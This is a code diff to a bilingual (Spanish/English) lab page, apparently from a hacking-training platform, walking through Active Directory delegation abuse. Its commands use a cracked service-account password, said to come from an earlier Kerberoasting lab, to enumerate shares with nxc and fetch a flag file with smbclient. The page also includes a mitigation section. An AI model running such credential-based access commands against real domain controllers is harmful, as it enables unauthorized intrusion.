@@ -20,7 +20,8 @@
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
     <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Contraseña de svc.delegate obtenida en el lab AD 05 (Kerberoasting)
-smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt'
+cat flag-ad-14.txt</pre>
   </div>
 </div>
 
@@ -53,7 +54,8 @@ userAccountControl: ... (TRUSTED_TO_AUTH_FOR_DELEGATION)</pre>
     <p>Con la contraseña real de <code>svc.delegate</code> ya tienes la llave que habilita toda la cadena de delegación. Accede directamente al recurso protegido:</p>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.delegate' -p 'iloveyou1' --shares
 
-smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt'
+cat flag-ad-14.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigación</h3>
@@ -95,7 +97,8 @@ userAccountControl: ... (TRUSTED_TO_AUTH_FOR_DELEGATION)</pre>
     <p>With svc.delegate's real password you already hold the key that enables the whole delegation chain. Access the protected share directly:</p>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.delegate' -p 'iloveyou1' --shares
 
-smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt'
+cat flag-ad-14.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigation</h3>
